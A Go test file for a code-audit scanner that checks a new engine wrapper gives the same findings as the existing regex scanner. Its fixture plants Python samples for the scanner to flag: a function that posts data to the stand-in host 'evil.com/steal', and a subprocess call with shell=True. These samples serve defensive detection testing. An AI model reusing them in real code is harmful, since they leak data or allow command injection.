package codeaudit

import (
	"reflect"
	"testing"
)

// engineFixture builds a directory that exercises every shape the engine
// boundary has to carry across unchanged: a HIGH finding, a MEDIUM finding, a
// clean file, and a nested file (so the directory walk is covered too).
func engineFixture(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import requests
def exfiltrate(data):
    requests.post("http://evil.com/steal", json=data)
`)
	writeTestFile(t, dir, "config.py", `
import os
def timeout():
    return os.environ.get("session_timeout", "3600")
`)
	writeTestFile(t, dir, "benign.py", `
def add(a, b):
    return a + b
`)
	writeTestFile(t, dir, "pkg/deep/util.py", `
import subprocess
def run(cmd):
    return subprocess.run(cmd, shell=True)
`)
	return dir
}

// scanOutcome is the part of a Report that production actually consumes:
// the pass decision, the counts it is derived from, and the findings that feed
// everything downstream (BuildFileReport, the LLM payload, the conclusion).
//
// Report.ScanTime is deliberately excluded. It is time.Now() formatted as
// RFC3339, so two consecutive scans straddling a second boundary would differ
// there while being identical in every decision-relevant respect. Comparing it
// would make this test flaky without testing anything.
type scanOutcome struct {
	Passed      bool
	HighCount   int
	MediumCount int
	FilesCount  int
	ScannedDir  string
	Findings    []Finding
}

func outcomeOf(r *Report) scanOutcome {
	return scanOutcome{
		Passed:      r.Passed,
		HighCount:   r.HighCount,
		MediumCount: r.MediumCount,
		FilesCount:  r.FilesCount,
		ScannedDir:  r.ScannedDir,
		Findings:    r.Findings,
	}
}

// TestDefaultEngineIsFaithfulToTheRegexScanner pins the engine boundary as a
// pure refactor. Introducing StaticEngine must not change a single decision:
// for every input, DefaultEngine() has to return exactly what DefaultScanner()
// returns.
//
// The fixture is asserted to be non-trivial first, because an equality
// assertion over two empty reports would pass while proving nothing.
func TestDefaultEngineIsFaithfulToTheRegexScanner(t *testing.T) {
	dir := engineFixture(t)

	baseline, err := DefaultScanner().ScanDirectory(dir)
	if err != nil {
		t.Fatalf("baseline scan: %v", err)
	}

	// Guard against a vacuous comparison: the fixture must produce findings of
	// both blocking-relevant severities, from more than one file.
	if len(baseline.Findings) == 0 {
		t.Fatal("fixture produced no findings; the comparison below would be vacuous")
	}
	if baseline.HighCount == 0 {
		t.Fatal("fixture produced no HIGH finding; the comparison below would be vacuous")
	}
	if baseline.MediumCount == 0 {
		t.Fatal("fixture produced no MEDIUM finding; the comparison below would be vacuous")
	}
	if baseline.FilesCount < 4 {
		t.Fatalf("fixture scanned %d files, want at least 4 (including the nested one)", baseline.FilesCount)
	}

	engine, err := DefaultEngine().ScanDirectory(dir)
	if err != nil {
		t.Fatalf("engine scan: %v", err)
	}

	if got, want := outcomeOf(engine), outcomeOf(baseline); !reflect.DeepEqual(got, want) {
		t.Errorf("DefaultEngine() diverged from DefaultScanner():\n got  %+v\n want %+v", got, want)
	}

	// The same must hold for the line-counting entry point, which
	// GenerateAuditReport uses and which returns a second value the report
	// does not carry.
	engineReport, engineLines, err := DefaultEngine().ScanDirectoryWithLines(dir)
	if err != nil {
		t.Fatalf("engine scan with lines: %v", err)
	}
	baseReport, baseLines, err := DefaultScanner().ScanDirectoryWithLines(dir)
	if err != nil {
		t.Fatalf("baseline scan with lines: %v", err)
	}
	if got, want := outcomeOf(engineReport), outcomeOf(baseReport); !reflect.DeepEqual(got, want) {
		t.Errorf("ScanDirectoryWithLines report diverged:\n got  %+v\n want %+v", got, want)
	}
	if !reflect.DeepEqual(engineLines, baseLines) {
		t.Errorf("ScanDirectoryWithLines line counts diverged:\n got  %+v\n want %+v", engineLines, baseLines)
	}
}

// TestDefaultEngineNameIsRegex pins which engine production runs. The name is
// what a report uses to prove which engine produced it, so the default must be
// stated in one place and asserted rather than inferred.
func TestDefaultEngineNameIsRegex(t *testing.T) {
	if got := DefaultEngine().Name(); got != EngineNameRegex {
		t.Errorf("DefaultEngine().Name() = %q, want %q", got, EngineNameRegex)
	}
}

// TestDefaultEngineIsRepeatable pins that the engine boundary holds no state
// across calls. Production reuses one engine for every import, so a scan must
// depend only on its input directory.
func TestDefaultEngineIsRepeatable(t *testing.T) {
	dir := engineFixture(t)

	first, err := DefaultEngine().ScanDirectory(dir)
	if err != nil {
		t.Fatalf("first scan: %v", err)
	}
	second, err := DefaultEngine().ScanDirectory(dir)
	if err != nil {
		t.Fatalf("second scan: %v", err)
	}

	if got, want := outcomeOf(second), outcomeOf(first); !reflect.DeepEqual(got, want) {
		t.Errorf("second scan of the same directory diverged from the first:\n got  %+v\n want %+v", got, want)
	}
}
